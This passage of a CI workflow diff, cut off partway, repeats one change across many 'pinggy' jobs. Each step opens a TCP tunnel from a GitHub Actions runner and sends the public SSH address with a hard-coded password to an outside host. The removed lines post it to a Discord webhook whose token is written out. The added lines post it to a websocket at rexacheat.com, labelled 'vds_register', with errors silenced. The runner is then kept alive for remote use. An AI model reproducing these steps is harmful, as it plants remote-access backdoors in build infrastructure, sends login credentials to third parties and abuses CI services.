@@ -30,7 +30,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -52,7 +61,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -74,7 +92,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -96,7 +123,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -118,7 +154,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -140,7 +185,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -162,7 +216,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-2:
@@ -190,7 +253,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -212,7 +284,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -234,7 +315,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -256,7 +346,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -278,7 +377,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -300,7 +408,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -322,7 +439,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-3:
@@ -350,7 +476,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -372,7 +507,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -394,7 +538,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -416,7 +569,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -438,7 +600,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -460,7 +631,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -482,7 +662,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-4:
@@ -510,7 +699,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -532,7 +730,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -554,7 +761,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -576,7 +792,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -598,7 +823,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -620,7 +854,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -642,7 +885,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-5:
@@ -670,7 +922,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -692,7 +953,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -714,7 +984,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
